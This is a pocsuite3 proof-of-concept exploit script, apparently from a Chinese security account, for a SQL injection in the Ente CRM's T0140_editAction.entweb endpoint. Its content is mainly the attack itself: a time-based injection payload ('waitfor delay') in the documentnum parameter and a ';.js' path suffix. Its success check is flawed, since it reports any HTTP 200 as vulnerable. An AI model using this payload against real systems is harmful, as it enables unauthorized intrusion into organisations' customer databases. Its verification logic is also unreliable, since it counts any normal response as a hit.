# _*_ coding:utf-8 _*_
# @Time : 2023/11/18 20:51
# @Author: 为赋新词强说愁
from pocsuite3.api import Output, POCBase, register_poc, requests, logger
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD, random_str

class Action_SQL(POCBase):
    pocDesc = ''' 浙大恩特客户资源管理系统中的T0140_editAction.entweb Sql注入漏洞'''
    vulID = '0'
    version = '1.0'
    author = '公众号网络安全透视镜'
    vulDate = '2023-11-18'
    createDate = '2023-11-18'
    updateDate = '2023-11-18'
    name = '浙大恩特客户资源管理系统T0140_editAction.entweb Sql注入漏洞'
    appName = '浙大恩特CRM'



    def _verify(self):

        result = {}
        path = "/entsoft/T0140_editAction.entweb;.js?" # 参数
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed exchange;v=b3;q=0.9',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'zh-CN,zh;q=0.9',
        }
        payload = {'method': 'getdocumentnumFlag', 'documentnum': "1';waitfor+delay+'0:0:3'"}
        url = self.url + path

        try:
            response = requests.get(url, headers=headers,params=payload, timeout=5)
        # 验证成功输出相关信息
            if response.status_code == 200:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
                result['VerifyInfo']['Name'] = payload

            return self.parse_output(result)
        except Exception as e:
            pass

register_poc(Action_SQL)